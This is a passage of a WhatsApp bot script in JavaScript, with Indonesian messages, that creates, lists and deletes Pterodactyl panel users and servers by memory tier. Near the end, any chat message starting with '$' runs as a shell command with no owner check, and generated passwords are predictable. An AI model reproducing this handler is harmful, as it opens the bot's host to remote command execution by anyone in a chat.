"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": {
if (!isOwner) return reply(mess.only.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await zyn.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
 
case 'totalcase': {
ngaceng = fs.readFileSync("./pain.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await zyn.fetchBlocklist()
let gcall = Object.values(await zyn.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
}
break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
